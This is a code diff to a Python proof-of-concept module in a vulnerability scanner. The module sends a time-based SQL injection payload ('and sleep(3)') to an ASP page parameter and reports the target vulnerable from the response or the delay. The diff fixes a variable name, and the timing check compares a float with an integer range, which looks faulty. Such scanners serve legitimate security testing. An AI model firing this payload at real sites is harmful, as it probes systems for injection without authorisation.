@@ -35,11 +35,10 @@ class Poc(ABPoc):
             # 参考：http://www.wooyun.org/bugs/wooyun-2014-057623
             verity_url = self.target + '/line/show.asp?id=926%27%20and%20sleep%283%29--%201'
             start = clock()
-            #code, head, res, errcode, _ = curl.curl(url)
             r = requests.get(verity_url)
-
+            response = r.text
             if r.status_code == 200:
-                if res.find('<script language=javascript>alert') != -1 or clock()-start in range(7, 12):
+                if response.find('<script language=javascript>alert') != -1 or clock()-start in range(7, 12):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
